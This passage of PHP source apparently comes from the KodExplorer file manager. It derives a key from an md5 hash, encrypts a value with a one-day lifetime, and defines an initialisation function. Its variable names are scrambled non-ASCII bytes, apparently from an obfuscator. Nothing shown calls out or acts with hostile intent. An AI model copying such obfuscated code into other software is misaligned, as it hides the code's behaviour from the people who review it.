substr(md5("\x6b\x6f\x64\x45\x78\x70\x6c\x6f\x72\x65\x72\x5f" . $Còò•ÏàÑÈ), 0, 15); $AÜ³ÅÊÛá™ = Mcrypt::encode($D–®ÒÑáÎ¦, $Còò•ÏàÑÈ, 3600 * 24); return $AÜ³ÅÊÛá™; } function init_config() { init_setting(); init_session(); init_space_size_hook(); }
